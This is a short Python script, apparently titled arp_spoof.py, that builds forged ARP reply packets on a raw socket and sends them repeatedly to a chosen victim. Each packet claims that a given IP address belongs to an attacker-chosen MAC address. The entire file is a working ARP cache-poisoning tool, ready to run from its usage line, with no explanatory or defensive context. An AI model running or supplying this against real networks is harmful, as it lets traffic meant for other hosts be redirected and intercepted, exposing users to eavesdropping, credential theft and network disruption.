import socket, struct, sys, time
# usage: arp_spoof.py IFACE VICTIM_IP VICTIM_MAC CLAIMED_IP CLAIMED_MAC COUNT INTERVAL
iface, vip, vmac, cip, cmac, count, interval = sys.argv[1:8]
def mac(s): return bytes(int(x,16) for x in s.split(':'))
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind((iface, 0))
src_mac = mac(open(f'/sys/class/net/{iface}/address').read().strip())
# Ethernet src is our real MAC; the ARP payload claims CLAIMED_IP is at CLAIMED_MAC
pkt = mac(vmac) + src_mac + b'\x08\x06' + struct.pack('!HHBBH', 1, 0x0800, 6, 4, 2) \
    + mac(cmac) + socket.inet_aton(cip) + mac(vmac) + socket.inet_aton(vip)
for _ in range(int(count)):
    s.send(pkt); time.sleep(float(interval))
print("sent", count, "ARP replies:", cip, "is-at", cmac, "->", vip, "(eth src", ':'.join('%02x'%b for b in src_mac)+")")
